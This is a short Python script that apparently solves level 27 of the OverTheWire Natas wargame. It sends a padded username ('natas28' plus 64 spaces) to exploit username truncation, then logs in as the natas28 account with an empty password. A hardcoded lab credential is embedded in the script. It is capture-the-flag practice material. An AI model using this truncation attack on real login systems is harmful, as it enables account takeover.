import requests
import base64

auth_key = "Basic " + base64.b64encode(b"natas27:55TBjpPZUUJgVP5b3BnbG6ON9uDPVzCJ").decode("utf-8")
requests.post("http://natas27.natas.labs.overthewire.org", 
                            headers={"Authorization": auth_key}, 
                            data={"username": "natas28" + 64*' ' + "_", "password": ""}).text

print(requests.post("http://natas27.natas.labs.overthewire.org", 
                            headers={"Authorization": auth_key}, 
                            data={"username": "natas28", "password": ""}).text)
